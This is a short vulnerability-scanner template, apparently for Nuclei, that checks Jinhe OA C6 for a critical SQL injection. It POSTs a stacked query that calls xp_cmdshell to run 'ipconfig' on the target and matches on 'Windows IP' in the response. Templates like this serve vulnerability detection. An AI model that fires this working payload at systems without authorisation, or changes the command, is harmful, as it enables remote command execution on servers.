id: jinhe-oa-c6-getSqlData-sqli

info:
  name: Jinhe OA C6 - SQL Injection
  author: Co5mos
  severity: critical

http:
  - raw:
      - |
        POST /C6/Control/GetSqlData.aspx/.ashx
        Host: {{Hostname}}
        Connection: close
        Content-Type: text/plain
        Accept-Encoding: gzip

        exec master..xp_cmdshell 'ipconfig'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Windows IP"
          - "Log Helper"
        condition: and

      - type: status
        status:
          - 200